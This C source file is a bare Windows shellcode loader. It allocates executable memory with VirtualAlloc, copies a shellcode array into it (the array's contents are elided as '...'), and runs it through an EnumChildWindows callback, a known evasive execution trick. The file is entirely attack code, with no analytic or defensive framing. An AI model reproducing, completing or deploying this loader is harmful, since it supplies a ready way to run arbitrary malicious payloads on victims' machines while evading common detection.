#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = ...

int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));
    EnumChildWindows(NULL, (WNDENUMPROC)addr, 0);
}